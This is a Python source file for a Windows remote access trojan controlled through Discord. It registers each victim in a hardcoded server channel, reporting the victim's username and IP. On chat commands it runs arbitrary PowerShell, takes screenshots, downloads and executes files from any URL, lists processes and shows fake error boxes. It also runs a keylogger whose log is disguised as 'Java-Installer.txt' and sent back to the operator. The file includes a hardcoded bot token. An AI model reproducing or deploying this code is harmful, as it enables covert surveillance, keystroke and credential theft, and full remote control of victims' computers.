import os, discord, subprocess, requests, pyautogui ,ctypes , sys
from dotenv import load_dotenv

load_dotenv()
login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()
guild_id = "1120790073386991706"  

@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://ipapi.co/json/").json()
    data= ip_address['country_name'], ip_address['ip']
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
    await channel.send(embed=embed)

@client.event 
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != session_id:
        return

    if message.content.startswith("!cmd"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        result = output.stdout.read() + output.stderr.read()
        if result == "":
            result = "Command Executed Successfully"
        embed = discord.Embed(title="CMD", description=f"```{result}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!screenshot":
        image = pyautogui.screenshot()
        image.save("screenshot.png")
        file = discord.File("screenshot.png")
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(file=file, embed=embed)

        if message.content == "!troll": 
            await message.reply("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

    if message.content.startswith("!uploadandrunfile"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        output = subprocess.Popen([os.path.basename(link)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = output.stdout.read() + output.stderr.read()
        if result == "":
            result = "File Executed Successfully" 
        embed = discord.Embed(title="Upload and Run", description=f"```{result}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)

    if message.content == "!listprocess":
            import os
            import subprocess
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)
    
    if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\Java-Installer.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfuly started")

    if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfuly stopped")

    if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = temp + r"\Java-Installer.txt"
            file = discord.File(file_keys, filename="Java-Installer.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.popen(f"del {file_keys}")

client.run('MTEyMDc5MDg5NTQ3ODk4MDY0OQ.GDbAxs.YGfSuv29umBnJpZcyXsamV3yaO5tqsrViOFGTA')